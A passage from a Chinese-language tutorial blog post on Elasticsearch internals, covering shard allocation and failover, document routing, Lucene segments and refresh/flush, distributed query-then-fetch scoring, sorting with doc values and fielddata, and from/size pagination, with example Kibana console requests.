rel="noopener">官网</a></p></blockquote><h2 id="分片与集群的故障转移"><a href="#分片与集群的故障转移" class="headerlink" title="分片与集群的故障转移"></a>分片与集群的故障转移</h2><h3 id="Primary-Shard-提升系统存储容量"><a href="#Primary-Shard-提升系统存储容量" class="headerlink" title="Primary Shard - 提升系统存储容量"></a>Primary Shard - 提升系统存储容量</h3><ul><li>分片是 ES 分布式储存的基石<ul><li>主分片 / 副本分片</li></ul></li><li>通过主分片，将数据分布在所有节点上<ul><li>Primary Shard , 可以将一份索引的数据，分散在多个 Data Node 上，实现储存的水平扩展</li><li>主分片（Primary Shard）数在索引创建时候指定，后续默认不能修改，如要修改，需重建索引</li></ul></li></ul><h3 id="Replica-Shard-提高数据可用性"><a href="#Replica-Shard-提高数据可用性" class="headerlink" title="Replica Shard - 提高数据可用性"></a>Replica Shard - 提高数据可用性</h3><ul><li>数据可用性<ul><li>通过引入副本分片（Replica Shard）提高数据的可用性。一旦主分片丢失，副本分片可以在 Promote 成主分片。副本分片数可以动态调整的。每个节点上都有完备的数据。如果不设置副本分片，一旦出现节点硬件故障，就有可能造成数据丢失。</li></ul></li><li>提高系统的读取性能<ul><li>副本分片由主分片（Primary Shard）同步。通过支持增加 Replica 个数，一定程度可以提高读取的吞吐量</li></ul></li></ul><h3 id="分片数的设置"><a href="#分片数的设置" class="headerlink" title="分片数的设置"></a>分片数的设置</h3><ul><li>如何规划一个索引的主分片数和副本分片数<ul><li>主分片数过小：例如创建一个 1 个 Primary Shard 的 index<ul><li>如果该索引增长很快，集群无法通过增加节点实现对这个索引的数据扩展</li></ul></li><li>主分片数设置过大：导致单个 Shard 容量很小，引发一个节点上有过多分片，影响性能</li><li>副本分片设置过多，会降低集群整体的写入性能</li></ul></li></ul><h3 id="单节点集群"><a href="#单节点集群" class="headerlink" title="单节点集群"></a>单节点集群</h3><ul><li>副本无法分片，集群状态为黄色</li></ul><p><img src="/images/big-data/es-06/3.jpg" alt="3"></p><blockquote><p>使用 cerebro 观察集群状态 <a href="https://github.com/lmenezes/cerebro" target="_blank" rel="noopener">https://github.com/lmenezes/cerebro</a></p></blockquote><h3 id="增加一个数据节点"><a href="#增加一个数据节点" class="headerlink" title="增加一个数据节点"></a>增加一个数据节点</h3><ul><li>集群状态转为绿色</li><li>集群具备故障转移能力</li><li>尝试着将 Replica 设置成 2 和 3，查看集群的状况</li></ul><p><img src="/images/big-data/es-06/4.jpg" alt="4"></p><h3 id="在增加一个节点"><a href="#在增加一个节点" class="headerlink" title="在增加一个节点"></a>在增加一个节点</h3><ul><li>集群具备故障转移能力</li><li>Master 节点会决定分片分配到哪个节点</li><li>通过增加节点数，提高集群的计算能力</li></ul><p><img src="/images/big-data/es-06/5.jpg" alt="5"></p><h3 id="故障转移"><a href="#故障转移" class="headerlink" title="故障转移"></a>故障转移</h3><ul><li>3 个节点共同组成。包含 1 个索引，索引设置了 3 个 Primary Shard 和 1 个 Replica</li><li>节点 1 是 Master 节点，节点意外出现故障。集群重新选举 Master 节点</li><li>Node3 上的 R0 提升成 P0 ，集群变黄</li><li>R0 和 R1 分配，集群变绿</li></ul><p><img src="/images/big-data/es-06/6.jpg" alt="6"></p><h3 id="集群健康状态"><a href="#集群健康状态" class="headerlink" title="集群健康状态"></a>集群健康状态</h3><ul><li>Green : 健康状态，所有的主分片和副本分片都可用</li><li>Yellow: 亚健康，所有的主分片可用，部分副本分片不可用</li><li>Red：不健康状态，部分主分片不可用</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_cluster/health</span><br></pre></td></tr></table></figure><p><strong>Demo</strong></p><ul><li>启动一个节点，3 个 Primary shard，1 个 Replica，集群黄色，因为无法分片 Replica</li><li>启动 3 个节点，1 个索引上包含 3 个 Primary Shard，一个 Replica</li><li>关闭 Node 1（Master）</li><li>查看 Master Node 重新选举</li><li>集群变黄，然后重新分配</li></ul><p><strong>小结</strong></p><ul><li>主分片，副本分片的作用<ul><li>主分片的分片数，设置后不能修改，除非重新索引数据</li><li>副本分片可以随时修改</li></ul></li><li>集群的故障转移<ul><li>需要集群具备故障转移的能力，必须将索引的副本分片数设置为1，否则，一点有节点就是，就会造成数据丢失</li></ul></li></ul><h2 id="文档分布式存储"><a href="#文档分布式存储" class="headerlink" title="文档分布式存储"></a>文档分布式存储</h2><h3 id="文档储存在分片上"><a href="#文档储存在分片上" class="headerlink" title="文档储存在分片上"></a>文档储存在分片上</h3><ul><li>文档会存储在具体的某个主分片和副本分片上：例如文档 1，会储存在 P0 和 R0 分片上</li><li>文档到分片的映射算法<ul><li>确保文档能均匀分布在所用分片上，充分利用硬件资源，避免部分机器空闲，部门机器繁忙</li><li>潜在的算法<ul><li>随机 / Round Robin. 当查询文档 1，分片数很多，需要多次查询才能查档文档 1</li><li>维护文档到分片的映射关系，当文档数据量大的时候，维护成本高</li><li>实时计算，通过文档 1，自动算出，需要去哪个分片上获取文档</li></ul></li></ul></li></ul><h3 id="文档到分片的路由算法"><a href="#文档到分片的路由算法" class="headerlink" title="文档到分片的路由算法"></a>文档到分片的路由算法</h3><ul><li>shard = hash(_routing) % number_of_primary_shards<ul><li>Hash 算法确保文档均匀分散到分片中</li><li>默认的_routing 值是文档 id</li><li>可以自行制定 routing 数值，例如用相同国家的商品，都分配到制定的 shard</li><li>设置 Index Setting 后，<strong>Primary 数，不能随意修改的根本原因</strong></li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT posts/_doc/100?routing=bigdata</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>: <span class="string">"Mastering Elasticsearch"</span>,</span><br><span class="line">  <span class="attr">"body"</span>: <span class="string">"Let's Rock"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h3><ul><li>顺序：index -&gt; hash -&gt; route -&gt; delete -&gt; index -&gt; success -&gt; response</li></ul><p><img src="/images/big-data/es-06/7.jpg" alt="7"></p><h3 id="删除一个文档"><a href="#删除一个文档" class="headerlink" title="删除一个文档"></a>删除一个文档</h3><ul><li>顺序 ：detele -&gt; hash&amp;route -&gt; delete -&gt; delete replica -&gt; success -&gt; deleted -&gt; response</li></ul><p><img src="/images/big-data/es-06/8.jpg" alt="8"></p><p><strong>小结</strong></p><ul><li>可以设置 Index Settings ，控制数据的分片</li><li>Primary Shard 的值不能修改，修改需要重新 Index。默认值是 5，从版本 7 开始，默认值为 1</li><li>索引写入数据后，Replica 值可以修改。增加副本，可提高大并发下的读取性能</li><li>通过控制集群的节点数，设置 Primary Shard 数，实现水平扩展</li></ul><h2 id="分片及其生命周期"><a href="#分片及其生命周期" class="headerlink" title="分片及其生命周期"></a>分片及其生命周期</h2><h3 id="分片的内部原理"><a href="#分片的内部原理" class="headerlink" title="分片的内部原理"></a>分片的内部原理</h3><ul><li>什么是 ES 的分片<ul><li>ES 中最小的工作单元 / 是一个 Lucence 的 Index</li></ul></li><li>一些问题：<ul><li>为什么 ES 的搜索时近实时的（1 秒后被搜到）</li><li>ES 如何保证在断电时数据也不会丢失</li><li>为什么删除文档，并不会立刻释放空间</li></ul></li></ul><h3 id="倒排索引的不可变性"><a href="#倒排索引的不可变性" class="headerlink" title="倒排索引的不可变性"></a>倒排索引的不可变性</h3><ul><li>倒排索引采用 Immutable Design, 一旦生成，不可更改</li><li>不可变性，带来了的好处如下：<ul><li>无需考虑并发写文件的问题，避免了锁机制带来的性能问题</li><li>一旦读入内核的文件系统缓存，便留在那里，只要文件系统存有足够的空间，大部分请求就会直接请求内存，不会命中磁盘，提高了很大的性能</li><li>缓存容易生成和维护 / 数据可以被压缩</li></ul></li><li>不可变更性，带来了的挑战：如果需要让一个新的文档可以被搜索，需要重建整个索引</li></ul><h3 id="Lucence-index"><a href="#Lucence-index" class="headerlink" title="Lucence index"></a>Lucence index</h3><ul><li>在 Lucene 中，单个倒排索引文件被称为 Segment。Segment 是自包含的，不可变更的。多个 Segments 汇总在一起，称为 Lucene 的 Index，其对应的就是 ES 中的 Shard</li><li>当有新文档写入时，会生成新的 Segment, 查询时会同时查询所有的 Segments，并且对结果汇总。Luncene 中有个文件，用来记录所有的 Segments 的信息，叫做 Commit Point</li><li>删除的文档信息，保存在”.del” 文件中</li></ul><p><img src="/images/big-data/es-06/9.jpg" alt="9"></p><h3 id="Refresh"><a href="#Refresh" class="headerlink" title="Refresh"></a>Refresh</h3><ul><li>将 Index buffer 写入 Segment 的过程叫做 Refresh。Refresh 不执行 fsync 操作</li><li>Refresh 频率：默认 1 秒发生一次，可通过 index.refresh_interval 配置。Refresh 后，数据就可以被搜索到了。这也就是为什么 ES 被称为近实时搜索</li><li>如果系统有大量的数据写入，那就会产生很多的 Segment</li><li>Index Buffer 被占满时，会触发 Refresh, 默认值是 JVM 的 10%</li></ul><p><img src="/images/big-data/es-06/10.jpg" alt="10"></p><h3 id="Transaction-Log"><a href="#Transaction-Log" class="headerlink" title="Transaction Log"></a>Transaction Log</h3><ul><li>Segment 写入磁盘的过程相对耗时，借助文件系统缓存，Refresh 时，先将 Segment 写入缓存以开放查询</li><li>蔚来保证数据不会丢失。所有在 Index 文档时，同时写 Transaction Log，高版本开始，Transaction Log 默认落盘。每个分片都有一个 Transaction Log</li><li>当 ES Refresh 时，Index Buffer 被清空，Transaction Log 不会清空</li></ul><p><img src="/images/big-data/es-06/11.jpg" alt="11"></p><h3 id="Flush"><a href="#Flush" class="headerlink" title="Flush"></a>Flush</h3><ul><li>ES Flush &amp; Lucene Commit<ul><li>调用 Refresh ，Index Buffer 清空并且 Refresh</li><li>调用 fsync, 将缓存中的 Segments 写入磁盘</li><li>清空（删除）Transaction Log</li><li>默认 30 分钟调用一次</li><li>Transaction Log 满（默认 512M）</li></ul></li></ul><p><img src="/images/big-data/es-06/12.jpg" alt="12"></p><h3 id="Merge"><a href="#Merge" class="headerlink" title="Merge"></a>Merge</h3><ul><li>Segment 很多，需要定期被合并<ul><li>减少 Segments / 删除已经删除的文档</li></ul></li><li>ES 和 Lucene 会自动进行 Merge 操作<ul><li>POST my_index/_forcemerge</li></ul></li></ul><h2 id="剖析分布式查询及相关性算法"><a href="#剖析分布式查询及相关性算法" class="headerlink" title="剖析分布式查询及相关性算法"></a>剖析分布式查询及相关性算法</h2><h3 id="分布式搜索的运行机制"><a href="#分布式搜索的运行机制" class="headerlink" title="分布式搜索的运行机制"></a>分布式搜索的运行机制</h3><ul><li>ES 的搜索，会分两阶段进行<ul><li>第一阶段 - Query</li><li>第二阶段 - Fetch</li></ul></li><li>Query-then-Fetch</li></ul><h3 id="Query-阶段"><a href="#Query-阶段" class="headerlink" title="Query 阶段"></a>Query 阶段</h3><ul><li>用户发出搜索请求到 ES 节点。节点收到请求后，会以 Coordinating 节点的身份，在 6 个主副分片中随机选择 3 个分片，发送查询请求</li><li>被选中的分片执行查询，进行排序。然后，每个分片都会返回 From + Size 个排序后的文档 Id 和排序值给 Coordinating 节点</li></ul><p><img src="/images/big-data/es-06/13.jpg" alt="13"></p><h3 id="Fetch-阶段"><a href="#Fetch-阶段" class="headerlink" title="Fetch 阶段"></a>Fetch 阶段</h3><ul><li>Coordinating Node 会将 Query 阶段，从每个分片获取的排序后的文档 Id 列表，重新进行排序。选取 From 到 From + Size 个文档的 Id</li><li>以 multi get 请求的方式，到相应的分片获取详细的文档数据</li></ul><h3 id="Query-Then-Fetch-潜在的问题"><a href="#Query-Then-Fetch-潜在的问题" class="headerlink" title="Query Then Fetch 潜在的问题"></a>Query Then Fetch 潜在的问题</h3><ul><li>性能问题<ul><li>每个分片上需要查的文档个数 = from + size</li><li>最终协调节点需要处理：number_of_shard * (from + size)</li><li>深度分页 (可以使用 Search After)</li></ul></li><li>相关性算分<ul><li>每个分片都基于自己的分片上的数据进行相关度计算。这会导致打分偏离的情况，特别是数据量很少时。相关性算分在分片之间是相互独立。当文档总数很少的情况下，如果主分片大于 1，主分片越多，相关性算分会越不准。</li></ul></li></ul><h3 id="解决算分不准的方法"><a href="#解决算分不准的方法" class="headerlink" title="解决算分不准的方法"></a>解决算分不准的方法</h3><ul><li>数据量不大的时候，可以将主分片数设置为 1<ul><li>当数据量足够大时候，只要保证文档均匀分散在各个分片上，结果一般就不会出现偏差</li></ul></li><li>使用 DFS Query Then Fetch<ul><li>搜索的 URL 中指定参数 “_search?search_type=dfs_query_then_fetch”</li><li>到每个分片把各分片的词频和文档频率进行搜集，然后完整的进行一次相关性算分，消耗更加多的 CPU 和内存，执行性能低下，一般不建议使用</li></ul></li></ul><h3 id="相关性算分问题-Demo"><a href="#相关性算分问题-Demo" class="headerlink" title="相关性算分问题 Demo"></a>相关性算分问题 Demo</h3><ul><li>写入 3 条记录 “Good” / “Good moring” / “good morning everyone”</li><li>使用 1 个主分片测试，Good 应该排在第一，Good DF 数值应该是 3</li><li>和 20 个主分片测试</li><li>当多个主分片时，3 个文档的算分都一样。可以通过 Explain API 进行分析</li><li>在 3 个主分片上执行 DFS Query Then Fetch ，结果和一个分片上一致</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">DELETE message</span><br><span class="line">PUT message</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>: <span class="number">20</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">GET message</span><br><span class="line">POST message/_doc?routing=1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"good"</span></span><br><span class="line">&#125;</span><br><span class="line">POST message/_doc?routing=2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"good morning"</span></span><br><span class="line">&#125;</span><br><span class="line">POST message/_doc?routing=3</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"good morning everyone"</span></span><br><span class="line">&#125;</span><br><span class="line">POST message/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST message/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"good"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST message/_search?search_type=dfs_query_then_fetch</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"good"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="排序及-Doc-Values-amp-Field-Data"><a href="#排序及-Doc-Values-amp-Field-Data" class="headerlink" title="排序及 Doc Values &amp; Field Data"></a>排序及 Doc Values &amp; Field Data</h2><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><ul><li>ES 默认采用相关性算分对结果进行降序排序</li><li>可以通过设置 sorting 参数，自行设定排序</li><li>如果不指定 _score, 算分为 null</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /kibana_sample_data_ecommerce/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"sort"</span>: [</span><br><span class="line">    &#123;<span class="attr">"order_date"</span>: &#123;<span class="attr">"order"</span>: <span class="string">"desc"</span>&#125;&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多字段进行排序"><a href="#多字段进行排序" class="headerlink" title="多字段进行排序"></a>多字段进行排序</h3><ul><li>组合多个条件</li><li>优先考虑写在前面的排序</li><li>支持对相关性算分进行排序</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /kibana_sample_data_ecommerce/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"sort"</span>: [</span><br><span class="line">    &#123;<span class="attr">"order_date"</span>: &#123;<span class="attr">"order"</span>: <span class="string">"desc"</span>&#125;&#125;,</span><br><span class="line">    &#123;<span class="attr">"_doc"</span>:&#123;<span class="attr">"order"</span>: <span class="string">"asc"</span>&#125;&#125;,</span><br><span class="line">    &#123;<span class="attr">"_score"</span>:&#123; <span class="attr">"order"</span>: <span class="string">"desc"</span>&#125;&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对-Text-类型排序"><a href="#对-Text-类型排序" class="headerlink" title="对 Text 类型排序"></a>对 Text 类型排序</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">GET kibana_sample_data_ecommerce/_mapping</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 text 字段进行排序。默认会报错，需打开fielddata</span></span><br><span class="line">POST /kibana_sample_data_ecommerce/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"sort"</span>: [</span><br><span class="line">    &#123;<span class="attr">"customer_full_name"</span>: &#123;<span class="attr">"order"</span>: <span class="string">"desc"</span>&#125;&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开 text的 fielddata</span></span><br><span class="line">PUT kibana_sample_data_ecommerce/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"properties"</span>: &#123;</span><br><span class="line">    <span class="attr">"customer_full_name"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fielddata"</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排序的过程"><a href="#排序的过程" class="headerlink" title="排序的过程"></a>排序的过程</h3><ul><li>排序是针对字段原始内容进行的。倒排索引无法发挥作用</li><li>需要用到正排索引。通过文档 ID 和字段快速得到字段原始内容</li><li>ES 有 2 种实现方式<ul><li>Fielddata</li><li>Doc Values (列式存储，对 Text 类型无效）</li></ul></li></ul><h3 id="Doc-Values-vs-Field-Data"><a href="#Doc-Values-vs-Field-Data" class="headerlink" title="Doc Values vs. Field Data"></a>Doc Values vs. Field Data</h3><table><thead><tr><th align="left"></th><th align="left">Doc Values</th><th align="left">Field data</th></tr></thead><tbody><tr><td align="left">何时创建</td><td align="left">索引时，和倒排索引一起创建</td><td align="left">搜索时候动态创建</td></tr><tr><td align="left">创建位置</td><td align="left">磁盘文件</td><td align="left">JVM Heap</td></tr><tr><td align="left">优点</td><td align="left">避免大量内存占用</td><td align="left">索引速度快，不占用额外的磁盘空间</td></tr><tr><td align="left">缺点</td><td align="left">降低索引速度，占用额外磁盘空间</td><td align="left">文档过多时，动态创建开销大，占用过多 JVM Heap</td></tr><tr><td align="left">缺省值</td><td align="left">ES 2.x 之后</td><td align="left">ES1.x 及之前</td></tr></tbody></table><h3 id="打开-Fielddata"><a href="#打开-Fielddata" class="headerlink" title="打开 Fielddata"></a>打开 Fielddata</h3><ul><li>默认关闭，可以通过 Mapping 设置打开。修改设置后，即时生效，无需缩减索引</li><li>其他字段类型不支持，支持对 Text 进行设定</li><li>打开后，可以对 Text 字段进行排序，但是是对分词后的 term 排序，所以，结果往往无法满足预期，不建议使用</li><li>部分情况下打开，满足一些聚合分析的特定需求</li></ul><h3 id="关闭-Doc-Values"><a href="#关闭-Doc-Values" class="headerlink" title="关闭 Doc Values"></a>关闭 Doc Values</h3><ul><li>默认启动，可以通过 Mapping 设置关闭<ul><li>增加索引的速度 / 减少磁盘空间</li></ul></li><li>如果重新打开，需要重建索引</li><li>什么时候需要关闭<ul><li>明确不需要做排序及聚合分析</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭 keyword的 doc values</span></span><br><span class="line">PUT test_keyword</span><br><span class="line">PUT test_keyword/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"properties"</span>: &#123;</span><br><span class="line">    <span class="attr">"user_name"</span>:&#123;</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"keyword"</span>,</span><br><span class="line">      <span class="attr">"doc_values"</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="获取-Doc-Values-amp-Fielddata-中储存的内容"><a href="#获取-Doc-Values-amp-Fielddata-中储存的内容" class="headerlink" title="获取 Doc Values &amp; Fielddata 中储存的内容"></a>获取 Doc Values &amp; Fielddata 中储存的内容</h3><ul><li>Text 类型的不支持 Doc Values</li><li>Text 类型打开 Fielddata 后，可以查看分词后的数据</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">DELETE temp_users</span><br><span class="line">PUT temp_users</span><br><span class="line">PUT temp_users/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"properties"</span>: &#123;</span><br><span class="line">    <span class="attr">"name"</span>:&#123;<span class="attr">"type"</span>: <span class="string">"text"</span>,<span class="attr">"fielddata"</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">    <span class="attr">"desc"</span>:&#123;<span class="attr">"type"</span>: <span class="string">"text"</span>,<span class="attr">"fielddata"</span>: <span class="literal">true</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST temp_users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"Jack"</span>,<span class="attr">"desc"</span>:<span class="string">"Jack is a good boy!"</span>,<span class="attr">"age"</span>:<span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开fielddata 后，查看 docvalue_fields数据</span></span><br><span class="line">POST  temp_users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"docvalue_fields"</span>: [</span><br><span class="line">    <span class="string">"name"</span>,<span class="string">"desc"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看整型字段的docvalues</span></span><br><span class="line">POST  temp_users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"docvalue_fields"</span>: [</span><br><span class="line">    <span class="string">"age"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Fielddata Demo</strong></p><ul><li>对Text字段设置fielddata ，支持随时修改</li><li>Doc Values 可以在Mapping 中关闭，但是需要重新索引</li><li>Text 不支持Doc Values</li><li>使用docvalue_fields 查看存储的信息</li></ul><h2 id="分页与遍历-From-Size-Search-After-amp-Scorll-API"><a href="#分页与遍历-From-Size-Search-After-amp-Scorll-API" class="headerlink" title="分页与遍历 - From, Size, Search After &amp; Scorll API"></a>分页与遍历 - From, Size, Search After &amp; Scorll API</h2><h3 id="From-Size"><a href="#From-Size" class="headerlink" title="From / Size"></a>From / Size</h3><ul><li>默认情况下，查询按照相关度算分排序，返回前 10 条记录</li><li>容易理解的分页方案<ul><li>From: 开始位置</li><li>Size: 期望获取文档的总数</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST kibana_sample_data_ecommerce/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"from"</span>: <span class="number">10</span>,</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分布式系统中深度分页的问题"><a href="#分布式系统中深度分页的问题" class="headerlink" title="分布式系统中深度分页的问题"></a>分布式系统中深度分页的问题</h3><ul><li>ES 天生就是分布式，查询信息，但是数据分别保存在多个分片，多台机器，ES 天生就需要满足排序的需要（按照相关性算分）</li><li>当一个查询：From = 990 ，Size =10<ul><li>会在每个分片上先获取 1000 个文档。然后，通过 Coordinating Node 聚合所有结果。最后在通过排序选取前 1000 个文档</li><li>页数越深，占用内容越多。为了避免深度分页带来的内存开销。ES 有个设定，默认限定到 10000 个文档<ul><li>index.max_result_window</li></ul></li></ul></li></ul><p><img 